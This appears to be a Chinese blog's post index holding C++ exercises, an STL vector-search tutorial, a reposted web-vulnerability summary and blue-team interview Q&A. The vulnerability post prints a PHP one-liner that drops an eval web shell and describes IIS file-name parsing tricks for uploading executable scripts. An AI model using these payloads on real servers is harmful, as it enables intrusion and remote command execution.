Student&#123;public: string room; string name; int height; int weight; void print() &#123; cout &lt;&lt; setfill(&#x27;0&#x27;) &lt;&lt; setw(6) &lt;&lt; room &lt;&lt; &quot; &quot; &lt;&lt; name &lt;&lt; &quot; &quot; &lt;&lt; height &lt;&lt; &quot; &quot; &lt;&lt; weight &lt;&lt; endl; &#125;&#125;;bool cmp(Student stu1, Student stu2)&#123; if (stu1.room != stu2.room) return stu1.room &lt; stu2.room; else return stu1.height &gt; stu2.height;&#125;void print(vector&lt;Student&gt; stu)&#123; string temp = &quot;&quot;; for (auto i : stu) &#123; if (i.room != temp) &#123; temp = i.room; i.print(); &#125; &#125;&#125;int main()&#123; int n; Student temp; vector&lt;Student&gt; student; cin &gt;&gt; n; for (int i = 0; i &lt; n; ++i) &#123; cin &gt;&gt; temp.room &gt;&gt; temp.name &gt;&gt; temp.height &gt;&gt; temp.weight; student.push_back(temp); &#125; // 优先按照宿舍号排序，宿舍号相同按照身高排序 sort(student.begin(), student.end(), cmp); // 挑选出寝室中最高的同学进行打印 print(student);&#125;","tags":"c++刷题"},{"title":"相邻数对","url":"/post/75b498b8.html","text":"【问题描述】 给定n个不同的整数，问这些数中有多少对整数，它们的值正好相差1。 【输入形式】 输入的第一行包含一个整数n，表示给定整数的个数。 第二行包含所给定的n个整数。 【输出形式】 输出一个整数，表示值正好相差1的数对的个数。 【样例输入】 6 10 2 6 3 7 8 【样例输出】 3 【样例说明】 值正好相差1的数对包括(2, 3), (6, 7), (7, 8)。 【评分标准】 评测用例规模与约定 1&lt;=n&lt;=1000，给定的整数为不超过10000的非负整数 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;class Pair&#123;public: int a; int b; bool operator==(const Pair&amp; rhs) &#123; return (a == rhs.a) &amp;&amp; (b == rhs.b); &#125; // 必须有，虽然不知道我哪里用到了两个Pair类对象进行相等比较，但是缺少对==的重载就会报错&#125;;int main()&#123; vector&lt;int&gt; num; int n, temp; int small, big; // 存放比当前数字小1和大1的数字 vector&lt;Pair&gt; res; // 存放相邻整数对 Pair temp_; // 临时变量 cin &gt;&gt; n; for (int i = 0; i &lt; n; ++i) &#123; cin &gt;&gt; temp; num.push_back(temp); &#125; for (auto i : num) &#123; small = i - 1; big = i + 1; if (count(num.begin(), num.end(), small)) // 存在比i小1的数字 &#123; temp_.a = small; temp_.b = i; if (!count(res.begin(), res.end(), temp_)) // 并且res中不存在该相邻整数对 res.push_back(temp_); &#125; if (count(num.begin(), num.end(), big)) // 存在比i大1的数字 &#123; temp_.a = i; temp_.b = big; if (!count(res.begin(), res.end(), temp_)) // 并且res中不存在该相邻整数对 res.push_back(temp_); &#125; &#125; cout &lt;&lt; res.size(); return 0;&#125;","tags":"c++刷题"},{"title":"==:不定义该运算符可接收的类型的转换","url":"/post/f18a017c.html","text":"前言ERROR：C2676 二进制“==”:“Pair”不定义该运算符或到预定义运算符可接收的类型的转换 解释这个报错大意就是说，编译器不知道Pair类的对象之间该如何判断是否相等 解决123456789101112class Pair&#123;public: int a; int b; // 在类里面增加对&quot;==&quot;的重载函数即可 bool operator==(const Pair &amp;rhs) &#123; return (a == rhs.a) &amp;&amp; (b == rhs.b); &#125;&#125;;","tags":"c++常见报错"},{"title":"vector判断与查找特定元素","url":"/post/d8a4edf7.html","text":"前言参考自：c++判断vector中是否存在特定元素的方法 vector并未提供确定某一元素是否存在或查找特定元素，但是STL算法提供了以下函数方便我们计算 函数与示例注：示例均包含下列头文件并使用std命名空间 12345#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;string&gt;using namespace std; 1. any_of应用：判断容器中是否存在满足期望的特定元素 参数：any_of包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为条件表达式 返回值：bool，1-&gt;存在满足期望的元素；0-&gt;不存在满足期望的元素 注意：any_of的第三个参数无法传入单个具体值，只能编写期望的条件表达式 实例： 1234vector&lt;int&gt; num = &#123;1, 3, 6, 2, 4&#125;;int i;if (any_of(num.begin(), num.end(), [] (int i) &#123;return i &gt; 1;&#125;)) // 判断容器中是否存在大于1的元素 cout &lt;&lt; &quot;number exists&quot; &lt;&lt; endl; 2. binary_search应用：对于从小到大排列的容器判断指定元素是否存在 参数：binary_search包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为指定元素 返回值：bool，1-&gt;指定元素存在；0-&gt;指定元素不存在 注意：使用该函数前必须保证容器中的元素从小到大进行排列 实例： 12345678910vector&lt;int&gt; num = &#123;1, 3, 6, 2, 4&#125;;int i;sort(num.begin(), num.end()); // 从小到大排列numi = binary_search(num.begin(), num.end(), 4); // 判断容器中是否存在4cout &lt;&lt; i; // 1-&gt;4存在；0-&gt;4不存在sort(num.begin(), num.end(), greater&lt;int&gt;()); // 从大到小排列numi = binary_search(num.begin(), num.end(), 4); // 判断容器中是否存在4cout &lt;&lt; i; // 1-&gt;4存在；0-&gt;4不存在 注：对于sort函数不熟悉可以查看c++ sort函数 3. std::count应用：计算指定元素的个数 参数：std::count包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为指定元素 返回值：指定元素的个数，不存在则返回0 注意：要么使用std命名空间，要么使用std::count 实例： 1234vector&lt;int&gt; num = &#123;1, 3, 6, 2, 4, 4&#125;;cout &lt;&lt; &quot;4的个数为: &quot; &lt;&lt; count(num.begin(), num.end(), 4) &lt;&lt; endl;if (!count(num.begin(), num.end(), 8)) cout &lt;&lt; &quot;number not exists! &quot; &lt;&lt; endl; 4. std::find应用：判断指定元素是否存在 参数：std::find包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为指定元素 返回值：指定元素的迭代器，如果不存在返回容器最后一个元素的下一个位置的迭代器(即num.end()) 注意：如果查找的元素不存在返回的是容器名.end()，如果查找元素不存在的话不可以打印*迭代器，否则会导致程序崩溃 实例： 123456vector&lt;int&gt; num = &#123;1, 3, 6, 2, 4&#125;;vector&lt;int&gt;::iterator i, j;i = find(num.begin(), num.end(), 10);if (i == num.end()) cout &lt;&lt; &quot;number not exists! &quot; &lt;&lt; endl;j = find(num.begin(), num.end(), 4); 5. std::find_if应用：获取满足条件的元素集合的第一个元素的迭代器 参数：std::find包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为条件表达式 返回值：满足条件的元素集合的第一个元素的迭代器，如果不存在满足条件的元素则返回容器最后一个元素的下一个位置的迭代器(即num.end()) 注意：如果查找的元素不存在返回的是容器名.end()，如果查找元素不存在的话不可以打印*迭代器，否则会导致程序崩溃 实例： 1234vector&lt;int&gt; num = &#123; 1, 3, 6, 2, 4, 4 &#125;;vector&lt;int&gt;::iterator i;i = find_if(num.begin(), num.end(), [](int j) &#123;return j &gt; 3 and j &lt; 5;&#125;);cout &lt;&lt; *i; 小结 对于从小到大排好序的vector，使用binary_search 仅判断是否存在某元素，使用find 需要某元素总个数时，使用count 支持复杂条件的查找时，使用any_of判断元素是否存在，使用find_if获取满足条件的元素集合的第一个元素的迭代器","tags":"c++实用函数"},{"title":"常见Web漏洞总结","url":"/post/64098964.html","text":"前言转载自：常见的Web应用的漏洞总结（原理、危害、防御） 一、 SQL注入(SQL Inject)[OWASP TOP1 2017]：1.原理：SQL注入就是把SQL命令插入到Web表单然后提交到所在页面请求（查询字符串），从而达到欺骗服务器执行恶意的SQL命令。它是利用现在已有的应用程序，将SQL语句插入到数据库中执行，执行一些并非按照设计者意图的SQL语句。2.原因：根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。3.危害：数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。网页篡改：通过操作数据库对特定网页进行篡改。网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。破坏硬盘数据，瘫痪全系统。4.防御：(1)严格的数据类型(2)字符转义(3)使用预编译语句(4)存储过程 二、 XSS(Cross-site Script)[OWASP TOP7 2017]原理：攻击者往Web页面里插入恶意html标签或者javascript代码。分别是反射型XSS、持久型XSS和DOM XSS危害：（1）网络钓鱼，盗取各类用户的账号（2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等（4）强制弹出广告页面，刷流量等（5）进行恶意操作，例如任意篡改页面信息，删除文章等，传播跨站脚本蠕虫，网页挂等（6）进行基于大量的客户端攻击，如DDOS攻击（7）结合其它漏洞，如CSRF漏洞。3.防御：（1）代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。（2）避免直接在cookie 中泄露用户隐私，例如email、密码等等。（3）通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。（4）尽量采用POST 而非GET 提交表单三、 上传漏洞原理文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器，服务器未经任何检验或过滤，从而造成文件的执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。危害1)上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。2)上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似);3)上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。4)上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。防御：（1）文件扩展名服务端白名单校验。（2）文件内容服务端校验。（3）上传文件重命名。（4）隐藏上传文件路径。（5）文件上传的目录设置为不可执行（6）单独设置文件服务器的域名以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。四、 文件解析漏洞1.IIS 6.0解析利用方法有两种（1）目录解析：/xx.asp/xx.jpg（2）文件解析：wooyun.asp;.jpg第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg会被服务器看成是wooyun.asp还有IIS6.0 默认的可执行文件除了asp还包含这三种.asa、.cer、.cdx2.Apache解析漏洞后缀名解析漏洞Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断直到识别。3.PHP CGI解析漏洞在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为 1&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;);?&gt; 1的文件，然后访问wooyun.jpg/x.php,（x.php不存在）在这个目录下就会生成一句话木马 shell.php。4.%00截断漏洞当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生 五、 CSRF（Cross-Site Request Forgery）1.原理：CSRF是一种夹持用户在已经登陆的web应用程序上执行非本意的操作的攻击方式。相比于XSS，CSRF是利用了系统对页面浏览器的信任，XSS则利用了系统对用户的信任。 由上图分析我们可以知道构成CSRF攻击是有条件的： 1、客户端必须一个网站并生成cookie凭证存储在浏览器中2、该cookie没有清除，客户端又tab一个页面进行访问别的网站2.危害攻击者利用会话劫持达到自己的目的，比如转账、积分等3.防御（1） GET、POST的正确使用（2） 利用验证码（在一定的情况下使用，但是为了防止客户产生不好印象，尽量不用）（3） Referer Check(HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。但服务器并非任何时候都能取到referer、保护客户隐私，不作为预防主要手段)（4） Anti CSRF Token：为每一个表单生成一个随机数秘钥，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。 六、 DDos攻击 分布式拒绝服务(Distributed Denial of service Attack)1.原理攻击者想办法让目标服务器的磁盘空间、内存、进程、网络带宽等资源被占满，从而导致正常用户无法访问。攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，无法接收新的请求;二是使用IP欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接。攻击者是使用傀儡机(俗称“肉鸡”，受病毒木马操控的计算机或服务器)作为攻击平台，通过大量伪装合法的请求占用大量网络资源，以达到使指定目标的网络或服务瘫痪中断。2.危害：服务器瘫痪、用户无法正常访问。3.类型（1）SYN Flood攻击：这种攻击方法是经典最有效的DDoS方法，主要是通过向受害主机发送大量伪造源 IP 和源端口的 SYN 或 ACK 包，导致主机的缓存资源被耗尽或忙于发送回应包而造成拒绝服务，可通杀各种系统的网络服务。这种攻击由于源头都是伪造的，所以追踪起来比较困难。但是，该攻击实施起来有一定难度，需要大量高带宽的僵尸主机。（2）TCP 全连接攻击：这种攻击是为了绕过常规防火墙的检查而设计的。一般情况下，常规防火墙大多对于正常的 TCP 连接是放过的，但是很多网络服务程序能接受的 TCP 连接数是有限的。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的 TCP 连接，直到服务器的内存等资源被耗尽而被拖跨， 从而造成拒绝服务。种攻击的特点是可绕过一般防火墙的防护而达到攻击;缺点是需要找很多僵尸主机，且僵尸主机的IP 是暴露，易被追踪。（3）刷 Script 脚本攻击：这种攻击是跟服务器建立正常的TCP连接， 并不断的向脚本程序提交查询、 列表等大量耗费数据库资源的调用。一般来说， 提交一个指令对客户端的耗费和带宽的占用是几乎可以忽略的，而服务器为处理此请求却可能要从上万条记录中去查出某个记录，这种处理过程对资源的耗费是非常大。攻击者只需通过代理向目标服务器大量递交查询指令，只需数分钟就会把服务器资源消耗掉而导致拒绝服务。这种攻击的特点是可以完全绕过普通的防火墙防护， 轻松找一些代理就可实施攻击;缺点是对付只有静态页面的网站效果会大打折扣，并且会暴露攻击者的IP地址。4.防御：（1）采用高性能的网络设备（2）尽量避免NAT的使用（NAT需要对地址来回转换，转换过程中需要对网络包的校验和进行计算，因此浪费了很多CPU的时间）（3）充足的网络带宽保证（4）升级主机服务器硬件（5）把网站做成静态页面（6）增强操作系统的TCP/IP栈（7）安装专业抗DDOS防火墙附：IP Spoof: 即IP地址欺骗，是一台主机设备冒充另外一台主机的IP地址，与其它设备通信，从而达到某种目的技术。属于IP Spoof类的攻击还有TCP 半连接攻击，也就是SYN Flood攻击","tags":"护网"},{"title":"蓝初面经","url":"/post/16a83dc0.html","text":"Windows 入侵排查思路？ 收集信息：收集与系统安全相关的信息，包括日志文件、进程列表、网络连接、系统配置等。 分析信息：对收集到的信息进行分析，确定异常行为和潜在威胁。 确认威胁：确认系统存在威胁，并确定其类型和程度。 阻止攻击：采取相应的措施，尽快阻止攻击并减少损失。 恢复系统：对受到攻击的系统进行恢复，确保其正常运行。 具体来说，可以采取以下几种方法进行入侵排查： 使用防病毒软件：定期使用防病毒软件扫描系统，及时发现并清除潜在的威胁。 定期更新系统：定期更新系统和安全补丁，以确保系统的安全性。 监控网络连接：监控网络连接情况，及时发现异常连接和流量，以及非法访问尝试。 分析日志文件：分析日志文件，了解系统的使用情况和异常行为，及时发现威胁。 使用安全工具：使用安全工具，如入侵检测系统、网络监控系统等，帮助发现和阻止威胁。 加强用户教育：加强用户教育，提高用户安全意识，减少人为因素对系统安全的影响。 总之，入侵排查需要综合运用多种工具和方法，不断加强系统的安全性和监控能力，以保障系统的安全运行。 Linux 入侵排查思路？ 收集基础信息：收集系统的版本、配置文件和日志等信息，了解系统的正常运行状态。 分析异常行为：通过比较正常状态与异常状态的差异，分析系统上出现的任何异常行为，例如不寻常的进程、网络流量或文件更改。 确认入侵点：确定攻击者可能入侵的方式，并检查是否存在未修复的漏洞。 隔离受感染的系统：及时隔离受感染的系统，以限制损害并避免进一步传播。 恢复系统：清除恶意代码并修复受损部分，通过备份恢复数据和配置文件，确保系统安全。 收集证据：收集入侵事件的详细信息，包括攻击的时间、入侵的方式、影响范围、损失情况等，以便后续追踪和定位攻击者。 在实际操作中，需要结合专业的工具和技能进行排查，例如使用抓包工具Wireshark分析网络流量、使用进程监控工具ps、top、htop等查看进程运行情况。同时，还需要不断学习更新各种安全相关的技能和知识，以提高排查入侵事件的能力。 Linux 如何查看登录日志？有哪些相关消息文件？在 Linux 系统中，可以通过以下方式查看登录日志： /var/log/auth.log文件：该文件记录了所有用户的认证信息，包括 SSH 登录、sudo 访问以及 su 切换等操作。 /var/log/secure文件：该文件用于记录系统身份验证和授权消息，通常在 Red Hat 系统上使用。其中包括 SSH 登录、sudo 访问以及 su 切换等操作。 /var/log/messages文件：该文件记录了系统的运行消息，包括启动和关闭服务、内核消息以及其他重要事件。 w命令：可以查看当前已登录的用户和他们的会话信息。 last命令：可以查看最近所有登录和注销会话的用户列表以及日期和时间。 lastlog命令：可以查看所有用户最后一次登录的时间和位置。 需要注意的是，在某些系统中这些文件名可能会有所不同，例如 Ubuntu 系统中的 /var/log/auth.log 文件可能是 /var/log/auth.log.1、/var/log/auth.log.2.gz等形式。因此，在查看登录日志时，最好先了解当前系统的具体情况。 Windows 和 Linux 的日志文件放在哪里？Windows: 系统事件记录器：Event Viewer 应用程序中提供了 Windows 系统的事件日志管理工具。这些日志文件通常存储在 C:\\Windows\\System32\\winevt\\Logs 目录中。 应用程序日志：包括应用程序特定的事件、错误和警告等信息，可以使用 Event Viewer 应用程序进行查看。这些日志文件通常存储在应用程序的安装目录下或者 Windows 系统目录中。 安全日志：记录有关系统安全性的重要信息，例如登录、注销、权限更改等。这些日志文件通常存储在 C:\\Windows\\System32\\winevt\\Security.evtx 文件中。 Linux: 系统日志：Linux 系统中的所有日志都存储在 /var/log 目录下。主要的日志文件包括： /var/log/messages：记录系统启动期间的消息以及其他系统级别的消息。 /var/log/syslog：记录核心系统日志，也包括其他应用程序的日志。 /var/log/auth.log：记录用户登录和其他身份验证相关事件的日志文件。 各种服务/软件的日志文件：各种服务或软件分别根据自己的命名规范来命名相应的日志文件，其中一些可能位于 /var/log 目录下，而另一些则可能位于 /var/log/service 目录下。 需要注意的是，日志文件在系统运行一段时间后可能会变得非常庞大，因此需要定期进行归档和清理，以释放磁盘空间并提高系统性能。 Linux 常用排查命令有哪些？在 Linux 系统中，有许多工具和命令可以用来排查问题。以下是一些常用的排查命令： top：显示当前系统中最占用 CPU 和内存的进程。 ps：显示当前系统所有运行的进程列表。 netstat：显示网络连接状态和统计信息，例如打开的端口、TCP/UDP 连接和网络接口等。 ifconfig/iwconfig：显示网络接口的状态和配置信息。 ping/traceroute：用于测试网络是否连通以及检测网络故障的工具。 df/du：显示磁盘使用情况，包括已用空间和可用空间等信息。 ls/lsof：用于查看打开的文件、目录和文件描述符。 strace/ltrace：跟踪应用程序执行期间的系统调用和库函数调用。 tcpdump：捕获网络数据包并将其记录到日志文件中，以便进行后续分析。 tail：实时监视日志文件，并显示最新添加的日志信息。 以上这些命令只是其中的一部分，不同的问题可能需要使用不同的命令和工具。在实际操作中，需要根据具体的情况选择合适的命令和工具，并结合自己的经验和知识进行排查。 Linux 的 Selinux 是什么？如何设置 Selinux？SELinux（Security-Enhanced Linux）是一个针对 Linux 内核的安全模块，它可以限制进程和用户的访问权限，并提供更加细粒度的访问控制。SELinux 基于强制访问控制（MAC）模型，将每个进程/对象分配到不同的安全上下文中，并通过策略文件来定义这些上下文之间的关系。 在 Linux 中，SELinux 可以通过以下步骤进行设置： 检查 SELinux 状态：使用命令 getenforce 或者 sestatus 来检查当前 SELinux 的状态，例如 enforcing、permissive 或者 disabled 等。 修改 SELinux 配置文件 /etc/selinux/config：可以修改 SELINUX 参数的值为 enforcing（强制模式）、permissive（宽容模式）或者disabled（禁用 SELinux）等。 安装和管理 SELinux 策略包：使用 yum 命令安装和管理 SELinux 相关的策略包，例如 policycoreutils 和 selinux-policy 等。 设定 SELinux 上下文：使用 chcon、semanage 和 restorecon 等命令来更改文件或目录的安全上下文。 确认 SELinux 日志：在排除 SELinux 相关问题时可以使用命令 ausearch、ausearch、auditctl 等来确认 SELinux 日志。 需要注意的是，在对 SELinux 进行设置和管理时，需要有一定的 Linux 系统管理经验和 SELinux 相关知识。因为错误的配置可能会导致系统不稳定或者无法启动，所以在操作前应仔细阅读相关文档并进行备份。 Linux、Windows 安全加固Linux 安全加固： 更新所安装的软件包：定期更新系统中所有软件包以修复已知漏洞。 禁用不必要的服务：禁用不必要的网络服务，减少攻击面。 配置防火墙：使用防火墙限制入站和出站网络流量，只允许合法的流量通过。 加强密码策略：设置强密码策略并启用多因素身份验证。 禁用 root 登录：禁止使用 root 用户登录系统，并将 sudo 和 su 访问权限限制到必要的人员或组。 使用 SELinux 或 AppArmor：使用 SELinux 或 AppArmor 来实现更细粒度的应用程序和文件访问控制。 配置 SSH 访问：使用 SSH 协议连接服务器时配置限制 IP 地址和端口号等安全措施。 定期备份数据：定期备份重要数据至外部存储设备，以防止数据丢失和系统损坏。 Windows 安全加固： 更新操作系统和软件：及时安装 Windows 操作系统和软件的安全更新。 禁用 SMBv1：由于 SMBv1 协议存在一些严重的漏洞，建议禁用 SMBv1 协议。 启用 UAC：启用用户账户控制（UAC），以限制非管理员用户的系统访问权限。 配置防火墙：使用 Windows 防火墙过滤不必要的网络流量，并确保只允许合法的流量通过。 使用 BitLocker 或类似的加密工具：对重要数据和文件进行加密存储，以避免数据泄漏。 配置组策略：使用本地组策略或 Active Directory 组策略来限制用户和计算机的访问权限。 检查安全事件日志：定期检查 Windows 安全事件日志，了解系统中发生的任何异常事件。 定期备份数据：定期备份重要数据至外部存储设备，以防止数据丢失和系统损坏。 需要注意的是，这些措施只是增强系统安全的一部分，而不能保证系统绝对安全。因此，建议采取多种方法来保护自己的系统和数据。 windows 日志分析工具 Event Viewer：Windows 自带的日志管理工具，可以查看和分析 Windows 系统中的各种事件日志。 Log Parser：一款免费的命令行工具，可以查询和分析日志文件、IIS 日志、Windows 注册表、Active Directory 等数据源。 Microsoft Message Analyzer：一款强大的网络协议分析工具，可以捕获和分析 Windows 操作系统上的网络流量和事件日志。 Syslog-ng：一个高性能的日志管理工具，可以帮助用户收集和分析来自不同平台的日志信息。 Graylog：一款开源的日志管理工具，可以帮助用户收集、存储和分析来自不同来源的日志信息，并提供直观易用的用户界面。 Splunk：一款商业化的日志管理工具，可以帮助用户实时监控、搜索、分析和可视化来自不同来源的日志信息。 需要注意的是，在选择日志分析工具时，需要根据自己的需求和实际情况进行选择，并结合相关操作系统和网络知识进行使用。 Linux 日志分析技巧命令 grep 命令：用于在文本文件中搜索指定的字符串和模式，例如可以使用 grep error /var/log/messages 命令来查找系统日志中的错误信息。 tail 命令：实时监视日志文件，并显示最新添加的日志信息，例如可以使用 tail -f /var/log/messages 命令来实时监视系统消息。 sed 和 awk 命令：可以用来编辑和处理文本文件，例如可以使用 awk ‘/error/ {print $0}’ /var/log/messages 命令来筛选出包含 error 字符串的日志信息。 journalctl 命令：用于查询和查看 systemd 系统日志，例如可以使用 journalctl -u nginx.service 命令来查看 Nginx 服务的日志信息。 dmesg 命令：用于打印内核环境变量缓冲区的内容包 Linux 基线规范 Linux 基线规范是指为了保证 Linux 系统安全性和可靠性，制定的一系列最佳实践和标准化要求。Linux 基线规范通常包括以下几个方面： 安全加固：禁用不必要的服务、配置防火墙、强化密码策略等。 用户和权限管理：创建普通用户账号、限制 root 账号访问、使用 sudo 进行授权等。 日志管理：启用系统日志、日志文件备份和归档、监控日志信息等。 文件系统和目录结构规范：对重要数据进行加密、使用 ext4 文件系统、分区管理等。 网络安全：检查网络连接状态、限制入站和出站流量、使用 SELinux 或 AppArmor 等。 软件更新与安全漏洞修复：定期更新操作系统和软件补丁、及时处理已知漏洞等。 数据备份与恢复：定期备份和恢复系统数据和设置等。 需要注意的是，不同的公司或组织可能会有不同的基线规范要求。在实践中，我们可以根据自己的需求和安全风险评估情况，设计并实施相应的基线规范，并定期进行评估和调整。这样可以帮助我们规范化 Linux 系统的管理和维护，并提高系统的可靠性和安全性。 Windows 安全基线检查Windows 安全基线检查是指通过对 Windows 操作系统进行安全配置和最佳实践检查，来评估系统的安全性和完整性。Windows 安全基线包括以下几个方面： 用户和权限管理：创建普通用户账号、限制管理员账号访问、使用 UAC 进行授权等。 密码策略：设置强密码策略，并启用多因素身份验证。 网络安全：配置防火墙、禁用不必要的服务、加密敏感数据传输等。 软件更新与安全漏洞修复：定期更新操作系统和软件补丁、及时处理已知漏洞等。 日志管理：启用系统日志、监控日志信息、建立日志归档等。 文件和目录权限：配置文件系统和目录结构规范、限制文件和目录访问权限等。 数据备份与恢复：定期备份和恢复系统数据和设置等。 为了进行 Windows 安全基线检查，可以使用 Microsoft Security Compliance Toolkit 工具，该工具包含安全基线和最佳实践检查工具，并提供安全配置模板和分析报告。此外，还可以使用第三方商业化工具，例如 SolarWinds、McAfee 等，来帮助进行 Windows 安全基线检查。 需要注意的是，安全基线检查只是评估系统安全性的一部分。为了保证 Windows 系统的安全性和可靠性，还需要采取其他措施，例如定期更新操作系统和软件补丁、加强密码策略、备份数据等。 中间件基线规范（APACHE）Apache 是一款常用的 Web 服务器软件，为了保障其安全可靠地运行，可以制定中间件基线规范。以下是 Apache 中间件基线规范的一些重要措施： 版本号管理：定期检查并更新 Apache 版本，及时安装最新版本的补丁与安全更新。 配置文件规范：对 Apache 的配置文件进行规范化和审计，限制网站访问权限、禁止目录浏览等。 日志管理：启用 Apache 访问日志和错误日志，定期清理日志文件并做好备份、归档等工作。 安全加固：如禁用不必要的模块、关闭 TRACE 请求响应、限制 HTTP 方法等。 SSL/TLS 加强：设置 TLS 选项、开启 HSTS、使用证书身份验证等。 防火墙和反向代理策略：通过防火墙等技术来过滤恶意流量，使用反向代理策略限制直接连接到 Web 服务器的 IP 地址。 应用安全：对 Web 应用程序进行安全审计，确保程序的漏洞被修复、未受到攻击等。 需要注意的是，以上这些措施只是 Apache 中间件基线规范的一部分，实际操作中还需要根据具体情况进行评估和调整。同时，要保障 Apache 服务器的安全性和可靠性，还需要定期备份数据、优化性能等工作。 中间件常见漏洞中间件是指应用程序和操作系统之间的软件组件，常见的中间件漏洞有以下几种： Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。 数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。 应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。 消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。 缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。 中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。 需要注意的是，中间件漏洞是日益增多的，因此建议及时更新和修补中间件的安全漏洞。 常见中间件的配置文件路径知道哪些？不同的中间件软件有不同的配置文件路径。以下是几种常见中间件软件的配置文件路径： Apache Web 服务器：httpd.conf 文件通常位于 /etc/httpd/ 或者 /usr/local/apache2/conf/ 目录下。 Nginx Web 服务器：nginx.conf 文件通常位于 /etc/nginx/ 或者 /usr/local/nginx/conf/ 目录下。 MySQL 数据库：my.cnf 文件通常位于 /etc/mysql/ 或者 /usr/local/mysql/etc/ 目录下。 PostgreSQL 数据库：postgresql.conf 和 pg_hba.conf 文件通常位于 /var/lib/pgsql/data/ 或者 /etc/postgresql//main/ 目录下。 Oracle 数据库：initSID.ora 和 listener.ora 文件通常位于 $ORACLE_HOME/dbs/ 目录下。 Tomcat 应用服务器：server.xml、context.xml 和 web.xml 文件通常位于 /conf/ 目录下。 JBoss 应用服务器：standalone.xml 和 standalone-full.xml 文件通常位于 /standalone/configuration/ 目录下。 需要注意的是，这些路径可能会根据不同的操作系统而有所不同，并且也会随着中间件版本的更新而变化。因此，在进行中间件配置时，建议查询官方文档或参考相关文献以获取最新的配置文件路径信息。 常用的安全工具以及常见的设备有哪些？常用的安全工具和设备有很多，以下是其中一些常见的： 防火墙（Firewall）：防火墙可以过滤网络流量，保护网络不受外部攻击。常见的防火墙包括硬件防火墙和软件防火墙。 入侵检测系统（Intrusion Detection System, IDS）：IDS 可以监控网络流量、检测恶意行为和入侵事件，并向管理员发出警报。 入侵防御系统（Intrusion Prevention System, IPS）：IPS 可以在 IDS 的基础上主动预防入侵事件，并进行自动化响应。 统一威胁管理平台（Unified Threat Management, UTM）：UTM 是一种集成了防火墙、IDS/IPS、VPN、反病毒等多种功能的综合性安全解决方案。 脆弱性扫描器（Vulnerability Scanner）：脆弱性扫描器可以发现系统中可能存在的漏洞，并提供修补建议。 安全信息和事件管理系统（Security Information and Event Management, SIEM）：SIEM 可以对安全事件和日志数据进行收集、分析和报告，帮助管理员更好地了解和响应安全事件。 代理服务器（Proxy Server）：代理服务器可以过滤流量、检查内容和访问控制，提供额外的安全保护。 负载均衡器（Load Balancer）：负载均衡器可以平衡网络流量，分担服务器负载，提高网络性能和可用性。 加密设备：加密设备可以对数据进行加密处理，防止数据被窃取或篡改。 需要注意的是，以上只是其中一些常见的安全工具和设备，实际应用中还有很多其他的安全工具和设备。在选择和使用安全工具和设备时，需要根据具体情况进行评估和选择，并确保其符合实际需求和安全标准。 